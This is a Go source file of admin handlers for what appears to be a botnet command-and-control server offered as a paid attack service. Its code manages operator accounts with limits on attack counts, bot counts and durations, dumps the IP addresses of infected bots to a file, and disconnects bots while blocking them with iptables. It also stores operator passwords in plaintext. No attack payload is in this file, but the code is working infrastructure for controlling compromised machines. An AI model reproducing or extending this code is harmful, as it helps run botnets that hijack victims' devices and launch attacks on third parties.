package handlers

import (
	"bufio"
	"cnc/internal/config"
	"cnc/internal/models"
	"cnc/internal/state"
	"cnc/internal/ui"
	"cnc/internal/util"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

func HandleAdminCommand(user *models.User) string {
	if !user.IsAdmin {
		return ui.RED + "Only admins can use !admin command\r\n" + ui.RESET
	}
	response := ui.CLEAR + ui.GREY2 + "\n Admin Commands:\r\n" +
		ui.GREY2 + "  !adduser               " + ui.WHITE + ":" + ui.GREY + " Add a new user" + ui.WHITE + ".\r\n" +
		ui.GREY2 + "  !removeuser <username> " + ui.WHITE + ":" + ui.GREY + " Remove a user" + ui.WHITE + ".\r\n" +
		ui.GREY2 + "  !kickuser <username>   " + ui.WHITE + ":" + ui.GREY + " Kick a connected user" + ui.WHITE + ".\r\n" +
		ui.GREY2 + "  !kickbots              " + ui.WHITE + ":" + ui.GREY + " kick bots" + ui.WHITE + ".\r\n" +
		ui.GREY2 + "  !dumpbots              " + ui.WHITE + ":" + ui.GREY + " Dump all bots" + ui.WHITE + ".\r\n\n\n\n\n\n\n" + ui.RESET
	return response
}

func isRootUser(username string) bool {
	settings, err := config.ReadSettings()
	if err != nil {
		return false
	}
	return username == settings.RootUser && settings.RootUser != ""
}

func HandleAddUserCommand(user *models.User, conn net.Conn) {
	if !isRootUser(user.User) {
		util.WriteToConn(conn, ui.RED+"Only root user can add users\r\n"+ui.RESET)
		return
	}

	reader := bufio.NewReader(conn)

	util.WriteToConn(conn, ui.GREY2+"Username    "+ui.WHITE+":"+ui.GREY+" "+ui.RESET)
	newuser, _ := reader.ReadString('\n')
	newuser = strings.TrimSpace(newuser)

	util.WriteToConn(conn, ui.GREY2+"Password    "+ui.WHITE+":"+ui.GREY+" "+ui.RESET)
	newpass, _ := reader.ReadString('\n')
	newpass = strings.TrimSpace(newpass)

	util.WriteToConn(conn, ui.GREY2+"Admin (y/n) "+ui.WHITE+":"+ui.GREY+" "+ui.RESET)
	adminResp, _ := reader.ReadString('\n')
	isAdmin := strings.ToLower(strings.TrimSpace(adminResp)) == "y"

	util.WriteToConn(conn, ui.GREY2+"Duration    "+ui.WHITE+":"+ui.GREY+" "+ui.RESET)
	maxtimeStr, _ := reader.ReadString('\n')
	maxtime, _ := strconv.Atoi(strings.TrimSpace(maxtimeStr))

	util.WriteToConn(conn, ui.GREY2+"Max bots    "+ui.WHITE+":"+ui.GREY+" "+ui.RESET)
	maxbotsStr, _ := reader.ReadString('\n')
	maxbots, _ := strconv.Atoi(strings.TrimSpace(maxbotsStr))

	util.WriteToConn(conn, ui.GREY2+"Max slots   "+ui.WHITE+":"+ui.GREY+" "+ui.RESET)
	maxslotsStr, _ := reader.ReadString('\n')
	maxslots, err := strconv.Atoi(strings.TrimSpace(maxslotsStr))
	if err != nil {
		util.WriteToConn(conn, ui.RED+"Invalid max slots.\r\n"+ui.RESET)
		return
	}

	util.WriteToConn(conn, ui.GREY2+"Max attacks "+ui.WHITE+":"+ui.GREY+" "+ui.RESET)
	maxattacksStr, _ := reader.ReadString('\n')
	maxattacks, _ := strconv.Atoi(strings.TrimSpace(maxattacksStr))

	util.WriteToConn(conn, ui.GREY2+"APi Access "+ui.WHITE+":"+ui.GREY+" "+ui.RESET)
	apiAccessResp, _ := reader.ReadString('\n')
	apiAccess := strings.ToLower(strings.TrimSpace(apiAccessResp)) == "y"

	if len(newuser) < 3 || len(newpass) < 4 || maxtime <= 0 || maxbots <= 0 || maxslots < 0 || maxattacks < 0 {
		util.WriteToConn(conn, ui.RED+"Invalid input.\r\n"+ui.RESET)
		return
	}

	var allUsers []models.User
	file, err := os.ReadFile("database/logins.json")
	if err == nil && len(file) > 0 {
		if err := json.Unmarshal(file, &allUsers); err != nil {
			util.WriteToConn(conn, ui.RED+"Error: Could not parse user database\r\n"+ui.RESET)
			return
		}
	} else if err != nil && !os.IsNotExist(err) {
		util.WriteToConn(conn, ui.RED+"Error: Could not read user database\r\n"+ui.RESET)
		return
	}

	for _, u := range allUsers {
		if u.User == newuser {
			util.WriteToConn(conn, ui.RED+"Error: User already exists\r\n"+ui.RESET)
			return
		}
	}

	newUser := models.User{
		User:          newuser,
		Pass:          newpass,
		IsAdmin:       isAdmin,
		MaxTime:       maxtime,
		MaxBots:       maxbots,
		MaxSlots:      maxslots,
		DailyLimit:    maxattacks,
		DailyUsed:     0,
		LastResetDate: time.Now().Format("2006-01-02"),
		ApiAccess:     apiAccess,
		ApiKey:        util.GenerateRandomString(32),
	}
	allUsers = append(allUsers, newUser)

	updatedData, err := json.MarshalIndent(allUsers, "", "  ")
	if err != nil {
		util.WriteToConn(conn, ui.RED+"Error: Could not format new user data\r\n"+ui.RESET)
		return
	}

	if err := os.WriteFile("database/logins.json", updatedData, 0644); err != nil {
		util.WriteToConn(conn, ui.RED+"Error: Could not write to user database\r\n"+ui.RESET)
		return
	}

	go config.LoadUsers()

	util.WriteToConn(conn, ui.GREEN+"User added successfully.\r\n"+ui.RESET)
}

func HandleRemoveUserCommand(user *models.User, command string, conn net.Conn) {
	if !isRootUser(user.User) {
		util.WriteToConn(conn, ui.RED+"Only root user can remove users\r\n"+ui.RESET)
		return
	}

	parts := strings.Fields(command)
	if len(parts) < 2 {
		util.WriteToConn(conn, ui.RED+"Usage: !removeuser <username>\r\n"+ui.RESET)
		return
	}
	target := parts[1]

	if isRootUser(target) {
		util.WriteToConn(conn, ui.RED+"Cannot remove root user\r\n"+ui.RESET)
		return
	}

	var allUsers []models.User
	file, err := os.ReadFile("database/logins.json")
	if err != nil {
		util.WriteToConn(conn, ui.RED+"Failed to open user database.\r\n"+ui.RESET)
		return
	}
	if err := json.Unmarshal(file, &allUsers); err != nil {
		util.WriteToConn(conn, ui.RED+"Failed to parse user database.\r\n"+ui.RESET)
		return
	}

	var updatedUsers []models.User
	found := false
	for _, u := range allUsers {
		if u.User == target {
			found = true
		} else {
			updatedUsers = append(updatedUsers, u)
		}
	}

	if !found {
		util.WriteToConn(conn, ui.RED+"User not found\r\n"+ui.RESET)
		return
	}

	updatedData, err := json.MarshalIndent(updatedUsers, "", "  ")
	if err != nil {
		util.WriteToConn(conn, ui.RED+"Error: Could not format updated user data\r\n"+ui.RESET)
		return
	}

	if err := os.WriteFile("database/logins.json", updatedData, 0644); err != nil {
		util.WriteToConn(conn, ui.RED+"Error: Could not write to user database\r\n"+ui.RESET)
		return
	}

	go config.LoadUsers()
	util.WriteToConn(conn, ui.GREEN+fmt.Sprintf("User %s removed\r\n", target)+ui.RESET)
}

// ไม่เปลี่ยนแปลง (จัดการ conn เอง)
func HandleKickUserCommand(user *models.User, command string, conn net.Conn) {
	if !user.IsAdmin {
		util.WriteToConn(conn, ui.RED+"Only admins can kick users\r\n"+ui.RESET)
		return
	}

	parts := strings.Fields(command)
	if len(parts) < 2 {
		util.WriteToConn(conn, ui.RED+"Usage: !kickuser <username>\r\n"+ui.RESET)
		return
	}
	target := parts[1]

	found := false
	kicked := false

	state.UsersMutex.Lock()
	state.UserSocketsMutex.Lock()
	for i := 0; i < state.UserCount; i++ {
		if state.Users[i].User == target {
			found = true
			if state.Users[i].IsLoggedIn && state.UserSockets[i] != nil {
				state.UserSockets[i].Close()
				state.UserSockets[i] = nil
				state.Users[i].IsLoggedIn = false
				kicked = true
			}
			break
		}
	}
	state.UserSocketsMutex.Unlock()
	state.UsersMutex.Unlock()

	if !found {
		util.WriteToConn(conn, ui.RED+"User not found\r\n"+ui.RESET)
	} else if !kicked {
		util.WriteToConn(conn, ui.RED+"User not connected\r\n"+ui.RESET)
	} else {
		util.WriteToConn(conn, ui.GREEN+fmt.Sprintf("Kicked user %s\r\n", target)+ui.RESET)
	}
}

func Handle_botdump_command(user *models.User, conn net.Conn) {
	if !user.IsAdmin {
		util.WriteToConn(conn, ui.RED+"Error: only admins can run this command\r\n"+ui.RESET)
		return
	}

	file, err := os.OpenFile("database/botsdumped.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		util.WriteToConn(conn, ui.RED+"Error: could not open file\r\n"+ui.RESET)
		return
	}
	defer file.Close()

	dumped := 0
	for i := 0; i < state.BotCount; i++ {
		state.BotMutex.Lock()
		b := state.Bots[i]
		state.BotMutex.Unlock()

		if b.IsValid && b.Conn != nil {
			addr := b.Conn.RemoteAddr()
			if addr != nil {
				_, _ = file.WriteString(fmt.Sprintf("%s:%s\n", addr.String(), b.Arch))
				dumped++
			}
		}
	}

	util.WriteToConn(conn, fmt.Sprintf(ui.GREEN+"Dumped %d bots successfully\r\n"+ui.RESET, dumped))
}

func HandleKickbotsCommand(user *models.User, command string, conn net.Conn) {
	settings, _ := config.ReadSettings()
	if user.User != settings.RootUser {
		util.WriteToConn(conn, ui.RED+"only root-user can use this command\n"+ui.RESET)
		return
	}

	parts := strings.Fields(command)
	if len(parts) < 2 {
		util.WriteToConn(conn, ui.RED+"Usage: !kickbots <name>\r\n"+ui.RESET)
		return
	}

	name := parts[1]

	state.BotMutex.Lock()
	targets := []int{}
	for i := 0; i < state.BotCount; i++ {
		if state.Bots[i].Arch == name && state.Bots[i].Conn != nil {
			targets = append(targets, i)
		}
	}
	state.BotMutex.Unlock()

	if len(targets) == 0 {
		util.WriteToConn(conn, fmt.Sprintf(ui.RED+"Invalid bot name %s\n"+ui.RESET, name))
		return
	}

	count := 0
	for _, i := range targets {
		exec.Command("iptables", "-A", "INPUT", "-s", state.Bots[i].Ip, "-j", "DROP").Run()
		state.Bots[i].Conn.Close()
		state.Bots[i].IsValid = false
		count++
	}

	util.WriteToConn(conn, fmt.Sprintf(ui.GREEN+"Successfully "+ui.GREY2+"kicked "+ui.WHITE+"%d "+ui.GREY2+"bots\n"+ui.RESET, count))
}